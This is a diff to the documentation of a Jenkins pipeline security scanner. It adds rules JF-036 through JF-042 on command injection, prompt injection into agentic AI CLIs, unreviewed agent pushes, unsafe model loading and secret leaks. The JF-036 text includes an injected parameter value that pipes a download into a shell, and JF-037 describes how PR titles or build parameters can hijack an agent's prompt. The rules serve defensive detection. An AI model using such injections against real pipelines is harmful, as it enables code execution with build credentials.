@@ -27,7 +27,7 @@ expression.
 
 ## What it covers
 
-35 checks · 12 have an autofix patch (``--fix``).
+42 checks · 12 have an autofix patch (``--fix``).
 
 | Check | Title | Severity | Fix |
 |-------|-------|----------|-----|
@@ -66,6 +66,13 @@ expression.
 | [JF-033](#jf-033) | withCredentials secret leaked via Groovy ${...} interpolation in sh step | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [JF-034](#jf-034) | Pipeline declares a password() build parameter | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 | [JF-035](#jf-035) | httpRequest step disables SSL verification | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [JF-036](#jf-036) | Script step interpolates a build parameter (params.*) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [JF-037](#jf-037) | Untrusted PR/build context reaches an agentic AI CLI (prompt injection) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [JF-038](#jf-038) | Agentic CLI output lands without human review | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [JF-039](#jf-039) | ML model loaded with trust_remote_code (code execution) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [JF-040](#jf-040) | AI model pulled without a pinned revision | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
+| [JF-041](#jf-041) | Unsafe deserialization of a fetched artifact (pickle RCE) | <span class="pg-sev pg-sev--high">HIGH</span> |  |
+| [JF-042](#jf-042) | Secret-named variable echoed / printed in a build step | <span class="pg-sev pg-sev--high">HIGH</span> |  |
 
 ---
 
@@ -217,11 +224,11 @@ Add a `sh 'syft . -o cyclonedx-json > sbom.json'` step (or Trivy with `--format 
 <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix pg-fix--rule" title="`--fix` will patch this rule">🔧 autofix</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span>
 </div>
 
-Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Secrets committed to Groovy source are visible in every fork and every build log.
+Scans the raw Jenkinsfile text against the cross-provider credential-pattern catalog. Values inside ``environment {}`` blocks also run through the keyed-hex and entropy passes (which need YAML-key context to fire). Secrets committed to Groovy source are visible in every fork and every build log.
 
 **Known false-positive modes**
 
-- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, vendor example keys). Well-known vendor example tokens (``AKIAIOSFODNN7EXAMPLE``, Stripe ``sk_test_`` docs keys) are suppressed via the ``VENDOR_EXAMPLE_TOKENS`` allowlist. Defaults to LOW confidence.
 
 <div class="pg-rule__rec" markdown>
 
@@ -732,7 +739,7 @@ JF-014 catches agent labels that aren't ephemeral; this rule catches the upstrea
 
 **Recommended action**
 
-Hard-code agent labels to a specific pool name. If label selection has to be parameterised, validate the candidate value against an explicit allowlist before the build starts (Groovy ``if`` guard at the top of the pipeline), and never inline ``${params.X}`` / ``${env.BRANCH_NAME}`` / ``${env.CHANGE_BRANCH}`` directly into ``label "..."``.
+Hard-code agent labels to a specific pool name. If label selection has to be parameterized, validate the candidate value against an explicit allowlist before the build starts (Groovy ``if`` guard at the top of the pipeline), and never inline ``${params.X}`` / ``${env.BRANCH_NAME}`` / ``${env.CHANGE_BRANCH}`` directly into ``label "..."``.
 
 </div>
 
@@ -801,6 +808,158 @@ The HTTP Request plugin's ``ignoreSslErrors: true`` flag tells the step to accep
 **Recommended action**
 
 Drop ``ignoreSslErrors: true`` from the ``httpRequest`` step. Fix certificate trust at the source: install the internal CA into the controller's truststore, or use a properly-issued certificate on the upstream service. Disabling verification on a CI runner lets any actor on the network path between Jenkins and the target inject responses, including payloads that flow into downstream stages.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## JF-036: Script step interpolates a build parameter (params.*) { #jf-036 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-78</span>
+</div>
+
+A Jenkins build parameter is set by whoever queues the run: anyone with Build permission, an upstream `build job:` passing `parameters:`, or a webhook / remote trigger. A `string` parameter is free-form text. When Groovy interpolates it into a double-quoted shell body (`sh "deploy ${params.TARGET}"`) the value is substituted *before* the shell parses the line, so `params.TARGET = 'x; curl evil | sh'` runs the injected command on the agent in the build's full credential context. This is the Jenkins peer of the GHA `${{ inputs.X }}` and ADO `${{ parameters.X }}` injection rules. Only double-quoted / triple-double-quoted bodies are flagged; single-quoted Groovy strings (`sh '... $params ...'`) don't interpolate and are safe. JF-002 covers the SCM-env-var (`$BRANCH_NAME`) variant and JF-033 the `withCredentials` secret-leak variant; this rule is specifically the build-parameter source.
+
+**Known false-positive modes**
+
+- A parameter consumed purely as data inside a double-quoted body (`sh "echo ${params.NOTE}"`) is still flagged: the double quotes let `$(...)` / backticks in the value execute, so it is genuinely injectable, not a false positive.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Don't splice `${params.X}` into a double-quoted `sh` / `bat` / `powershell` body. Single-quote the Groovy string so it isn't interpolated, and let the shell read the value from the environment: `withEnv(["TAG=${params.TAG}"]) { sh 'build --tag "$TAG"' }`. The single-quoted form passes the value as one literal argument instead of letting it break out of the command.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## JF-037: Untrusted PR/build context reaches an agentic AI CLI (prompt injection) { #jf-037 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-77</span>
+</div>
+
+The AI analog of JF-002 (script injection). Fires when a ``sh`` / ``bat`` / ``powershell`` step invokes an agentic CLI (claude / gemini / cursor-agent / aider / openhands / goose / ``q chat``) AND attacker-controllable Jenkins context reaches it: an SCM-event env var (`$BRANCH_NAME` / `$CHANGE_TITLE` / `$CHANGE_BRANCH` / `$TAG_NAME` / `$GIT_*`) or a `${params.X}` build parameter. Unlike JF-002, both single- and double-quoted step bodies are flagged: an LLM ingests the value as prompt text regardless of Groovy quoting, so the JF-002 mitigation (single-quote the body) does not apply, which is why this is a separate rule.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Do not place attacker-controllable context (a PR's branch / tag / title, `$CHANGE_*`, or a `${params.X}` build parameter) in an agentic CLI's prompt. Groovy single-quoting does NOT sanitize a prompt the way it does a shell command, the model still reads the value. If the agent must see PR content, run it in a stage with no credentials bound and no tool / shell access, and treat its output as untrusted.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## JF-038: Agentic CLI output lands without human review { #jf-038 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--esf">ESF-C-APPROVAL</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-693</span>
+</div>
+
+Fires when one Jenkinsfile both invokes an agentic CLI (``claude`` / ``gemini`` / ``cursor-agent`` / ``aider`` / ``openhands`` / ``goose`` / ``q chat``) in a ``sh`` / ``bat`` / ``powershell`` step and, in the same pipeline, lands the result with a ``git push`` (the Jenkins idiom for committing straight to a branch, since there are no ``uses:`` actions). Coupling is pipeline-level because the stages of one pipeline share a checkout.
+
+Does NOT fire when the agent only opens a pull request for review, nor on a push step that does not run an agent (ordinary formatting / generated-file jobs). The agent-plus-push coupling is the signal. A ``git push --dry-run`` is ignored.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Don't let an agentic CLI's output reach a branch without a human review gate. Have the agent open a normal pull request (no auto-merge) so a person reviews the diff before it lands, and don't pair the agent with a ``git push`` straight to a branch in the same pipeline. If the agent's prompt can be influenced by untrusted input (a PR title / branch, a build parameter), treat the committed result as attacker-controlled.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## JF-039: ML model loaded with trust_remote_code (code execution) { #jf-039 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
+</div>
+
+Fires on ``trust_remote_code=True`` / ``--trust-remote-code`` in a ``sh`` / ``bat`` / ``powershell`` step body (the shared ``model_trust`` detector, with GHA-120 / GL-045 / BB-035 / ADO-034 / HARNESS-010). Groovy quoting does not defang it: the loader runs the model repo's own Python regardless of how the command string is quoted, so both single- and double-quoted step bodies are flagged. The transformers / huggingface_hub loader executes that code at load time, so an untrusted or unpinned model is arbitrary code execution on the agent with the build's credentials in scope.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Load models with ``trust_remote_code=False`` (the library default). If a model genuinely needs custom code, vet it and pin an exact revision (a commit SHA, not a tag or branch), run the load in a stage with no production credentials bound, and prefer safetensors weights over pickle.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--medium" markdown>
+
+## JF-040: AI model pulled without a pinned revision { #jf-040 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-PIN-DEPS</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
+</div>
+
+Fires on a ``sh`` / ``bat`` / ``powershell`` step that fetches a model by a mutable registry reference and supplies no revision pin (the shared ``model_ref`` detector, with GHA-121 / GL-046 / BB-038 / ADO-037 / HARNESS-012). Detected fetch forms: ``from_pretrained("org/model")``, ``hf_hub_download`` / ``snapshot_download`` with a ``org/model`` repo id, and ``huggingface-cli download org/model``.
+
+Does NOT fire when a revision is pinned in the same step (``revision='<sha>'`` / ``--revision <sha>``), when the reference is a local path or a variable interpolation (the value can't be judged statically), or on a bare single-segment canonical hub name (``bert-base-uncased``) with no ``org/`` namespace, since those are first-party and the org-scoped third-party models are the higher-risk surface.
+
+**Known false-positive modes**
+
+- A team that re-pulls its own org's model on every run may treat the latest revision as intentional. The right fix is still to pin the revision (it makes an upstream compromise visible); if a rolling pull is genuinely wanted, suppress on the specific step with a rationale naming the model and who controls it.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Pin the model to an immutable revision. Pass an exact commit ``revision=`` to ``from_pretrained`` / ``hf_hub_download`` / ``snapshot_download`` (a 40-char commit SHA, not a branch or a tag, both of which the owner can move), or ``--revision <sha>`` to ``huggingface-cli download``. A pinned revision is what makes a swapped-weights or swapped-loader-code attack show up as a diff in your repo instead of silently landing on the next build. Pair with ``trust_remote_code=False`` (JF-039) and prefer safetensors weights over pickle.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## JF-041: Unsafe deserialization of a fetched artifact (pickle RCE) { #jf-041 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-4</span> <span class="pg-tag pg-tag--esf">ESF-D-INJECTION</span> <span class="pg-tag pg-tag--cwe">CWE-502</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
+</div>
+
+Reuses the shared ``unsafe_deser`` detector (with GHA-122 / GL-047 / BB-037 / ADO-036 / HARNESS-011) over each ``sh`` / ``bat`` / ``powershell`` step body. Fires in two shapes: (A) an explicit unsafe opt-in (``weights_only=False`` on a load, or ``allow_pickle=True`` on ``numpy.load``), always; and (B) a remote fetch (``curl`` / ``wget`` / ``hf_hub_download`` / ``snapshot_download`` / ``huggingface-cli download`` / ``requests.get`` / ``urlretrieve``) together with a pickle-backed loader (``torch.load`` / ``pickle.load(s)`` / ``joblib.load``) in the same step, with no safe path (``weights_only=True`` / safetensors). A bare local unpickle with no fetch does not fire.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Don't deserialize a downloaded artifact through pickle. Load weights with safetensors, or pass ``weights_only=True`` to ``torch.load`` (the PyTorch 2.6+ default) so only tensors, not arbitrary Python, are unpickled. Drop ``allow_pickle=True`` from ``numpy.load``. If a pickle / joblib artifact is unavoidable, pin and verify its source (a pinned revision, a checksum, a signature) and load it in a stage with no production credentials bound.
+
+</div>
+
+</div>
+
+<div class="pg-rule pg-rule--high" markdown>
+
+## JF-042: Secret-named variable echoed / printed in a build step { #jf-042 }
+
+<div class="pg-rule__tags">
+<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-532</span> <span class="pg-tag pg-tag--cwe">CWE-200</span>
+</div>
+
+Scans every ``sh`` / ``bat`` / ``powershell`` step body for a credential variable handed to ``echo`` / ``printf`` / ``cat`` / ``tee``, for an ``env`` / ``printenv`` dump, and for ``set -x`` with a secret-named variable in scope (the shared ``log_leak`` detector, with GHA-033 / GL-036 / BB-032 / ADO-031 / CC-032). The credential set is the union of name-pattern matches (PASSWORD / TOKEN / SECRET / API_KEY / CREDENTIAL) and the variable names bound by ``withCredentials([... variable: 'X'])`` anywhere in the Jenkinsfile, so a non-obviously-named bound credential (``variable: 'GH'``) is still caught when it is echoed. The Jenkins analog of GL-036 / CC-032.
+
+<div class="pg-rule__rec" markdown>
+
+**Recommended action**
+
+Don't print secret values in build steps. Jenkins masks credentials bound with ``withCredentials`` in the console, but only the exact bound string. Encoded, truncated, or derived forms bypass the mask, and ``set -x`` / ``env`` / ``printenv`` dump the raw value before masking can catch it. Log a boolean instead (``[ -n "$TOKEN" ] && echo set || echo unset``), and avoid ``set -x`` while a credential variable is in scope.
 
 </div>
 
